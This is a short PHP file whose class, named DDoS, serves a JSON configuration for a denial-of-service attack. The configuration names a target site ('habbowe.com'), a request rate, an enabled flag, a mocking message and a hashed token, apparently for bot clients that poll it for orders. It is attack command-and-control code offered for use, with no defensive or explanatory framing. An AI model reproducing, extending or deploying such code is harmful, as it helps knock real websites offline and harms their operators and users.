<?PHP

class DDoS
{
	private $Config	= array();

	function __construct()
	{	
		
			$this->Config['enabled']	=	true;
			$this->Config['message']	=	"Malditas malditas malditas";
			$this->Config['ramdom']		=	hash('haval256,5', md5( sha1('SeguridadDeKevinYHector123') ));

			switch (rand(1,1)) 
			{
				case 1:
					$this->Config['target']	=	"http://habbowe.com";
					$this->Config['rate']	= 	5;
					break;
				
				case 2:
					$this->Config['target']	=	"http://Otraweb.com";
					$this->Config['rate']	=	2;
					break;
			}

			echo json_encode($this->Config);
		
	}

	private function isAjax()
	{
		return ( strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') ? true : false;
	}
}

new DDoS();
?>